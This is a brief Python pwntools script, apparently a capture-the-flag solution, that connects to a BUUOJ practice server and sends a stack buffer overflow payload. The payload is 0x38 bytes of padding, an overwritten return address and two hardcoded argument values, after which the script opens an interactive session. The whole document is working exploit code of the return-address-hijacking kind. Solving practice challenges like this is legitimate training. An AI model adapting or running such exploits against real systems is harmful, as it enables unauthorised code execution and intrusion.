from pwn import *
sh=remote("node4.buuoj.cn",26841)
#sh=process("./timu")
payload=0x38*b'a'+p32(0x080489A0)+p32(0x0804E6A0)+p32(0x308CD64F)+p32(0x195719D1)
sh.sendline(payload)
print(sh.recv())
sh.interactive()
